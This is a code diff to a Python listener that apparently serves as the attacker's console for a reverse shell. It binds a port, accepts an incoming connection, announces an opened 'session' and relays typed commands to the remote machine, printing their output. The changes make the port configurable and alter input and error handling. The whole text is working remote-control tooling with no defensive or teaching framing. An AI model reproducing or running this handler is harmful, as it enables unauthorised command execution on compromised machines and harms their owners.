@@ -31,10 +31,11 @@ def socketCreate():
         global s
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         host = ''
-        port = 5151 #input("Port to listen on: ")
-        if port == '':
-            socketCreate()
-        port = int(port)
+        port = input("Port to listen on: ")
+        try:
+            port = int(port)
+        except Exception:
+            print("Invalid port.\n")
     except Exception as e:
         print(e, "line 38")
 
@@ -44,8 +45,8 @@ def socketBind():
         s.bind((host, port))
         s.listen(1)
     except Exception as e:
-        print(e, "line 46")
-        print("Retrying...")
+        print(e)
+        print("Bind failed, retrying...")
         socketBind()
 
 def socketAccept():
@@ -56,8 +57,7 @@ def socketAccept():
     try:
         conn, addr = s.accept()
         connected = True
-        print("[!] Session opened at %s:%s" %(addr[0], addr[1]))
-        print("")
+        print("[!] Session opened at %s:%s\n" %(addr[0], addr[1]))
         start = conn.recv(1024).decode()
         print(start, end = "")
         menu()
@@ -67,18 +67,28 @@ def socketAccept():
 def menu():
     while 1:
         cmd = input()
-        if cmd == "quit":
-            conn.close()
-            s.close()
-            sys.exit()
-        try:
-            command = conn.send(cmd.encode())
-        except:
-            connected = False
-            break
-        result = conn.recv(16834)
-        result = result.decode()
-        print(result, end = "")
+        if cmd:
+            if cmd == "quit":
+                conn.close()
+                s.close()
+                sys.exit()
+            try:
+                command = conn.send(cmd.encode())
+            except:
+                connected = False
+                break
+            result = conn.recv(16834)
+            result = result.decode()
+            print("\n" + result, end = "")
+        else:
+            try:
+                command = conn.send(" ".encode())
+            except:
+                connected = False
+                break
+            result = conn.recv(16834)
+            result = result.decode()
+            print(result, end = "")
 
 socketCreate()
 socketBind()
